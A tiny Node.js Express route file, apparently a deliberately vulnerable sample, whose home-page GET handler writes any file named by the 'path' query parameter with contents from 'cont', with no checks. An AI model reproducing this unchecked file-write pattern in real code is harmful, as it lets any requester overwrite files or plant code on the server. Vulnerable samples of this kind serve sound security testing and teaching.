var fs = require('fs');
var express = require('express');
var router = express.Router();

/* GET home page. */
router.get('/', function(req, res, next) {
    fs.writeFileSync(req.query.path, req.query.cont, "UTF-8");
    res.send('success')
});

module.exports = router;
